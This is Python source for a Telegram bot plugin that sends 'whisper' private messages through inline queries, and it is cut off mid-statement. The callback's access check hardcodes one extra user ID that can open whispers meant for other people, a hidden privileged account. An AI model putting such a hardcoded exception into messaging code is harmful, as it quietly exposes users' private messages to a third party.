from AloneXMusic import app as app
from config import BOT_USERNAME
from pyrogram import filters
from pyrogram.types import (
    InlineQueryResultArticle, InputTextMessageContent,
    InlineKeyboardMarkup, InlineKeyboardButton
)

whisper_db = {}

switch_btn = InlineKeyboardMarkup([[InlineKeyboardButton(" Start Whisper", switch_inline_query_current_chat="")]])


async def _whisper(_, inline_query):
    data = inline_query.query.strip()
    results = []

    if not data:
        messages = await in_help()
        await inline_query.answer(messages)
        return

    try:
        username_or_id, message = data.split(maxsplit=1)
    except ValueError:
        messages = [
            InlineQueryResultArticle(
                title=" Whisper",
                description=f"@VeenaMusic_bot [USERNAME | ID] [TEXT]",
                input_message_content=InputTextMessageContent(f"**Usage:**\n\n@VeenaMusic_bot (Target Username or ID) (Your Message).\n\n**Example:**\n@VeenaMusic_bot @username Aditya is My Boyfriend"),
                thumb_url="https://te.legra.ph/file/3eec679156a393c6a1053.jpg",
                reply_markup=switch_btn
            )
        ]
        await inline_query.answer(messages)
        return

    try:
        user = await _.get_users(username_or_id)
    except:
        messages = [
            InlineQueryResultArticle(
                title=" Whisper",
                description="Invalid username or ID!",
                input_message_content=InputTextMessageContent("Invalid username or ID!"),
                thumb_url="https://graph.org/file/58a92a46d67838caaf301.jpg",
                reply_markup=switch_btn
            )
        ]
        await inline_query.answer(messages)
        return

    whisper_btn = InlineKeyboardMarkup([[InlineKeyboardButton(" Whisper", callback_data=f"fdaywhisper_{inline_query.from_user.id}_{user.id}")]])
    one_time_whisper_btn = InlineKeyboardMarkup([[InlineKeyboardButton(" One-Time Whisper", callback_data=f"fdaywhisper_{inline_query.from_user.id}_{user.id}_one")]])
    messages = [
        InlineQueryResultArticle(
            title=" Whisper",
            description=f"Send a Whisper to {user.first_name}!",
            input_message_content=InputTextMessageContent(f" You are sending a whisper to {user.first_name}.\n\nType your message/sentence."),
            thumb_url="https://te.legra.ph/file/3eec679156a393c6a1053.jpg",
            reply_markup=whisper_btn
        ),
        InlineQueryResultArticle(
            title=" One-Time Whisper",
            description=f"Send a one-time whisper to {user.first_name}!",
            input_message_content=InputTextMessageContent(f" You are sending a one-time whisper to {user.first_name}.\n\nType your message/sentence."),
            thumb_url="https://te.legra.ph/file/3eec679156a393c6a1053.jpg",
            reply_markup=one_time_whisper_btn
        )
    ]
    await inline_query.answer(messages)
    whisper_db[f"{inline_query.from_user.id}_{user.id}"] = message


@app.on_callback_query(filters.regex(pattern=r"fdaywhisper_(.*)"))
async def whispes_cb(_, query):
    data = query.data.split("_")
    from_user, to_user = int(data[1]), int(data[2])
    user_id = query.from_user.id

    if user_id not in [from_user, to_user, 6661176722]:
        try:
            await _.send```
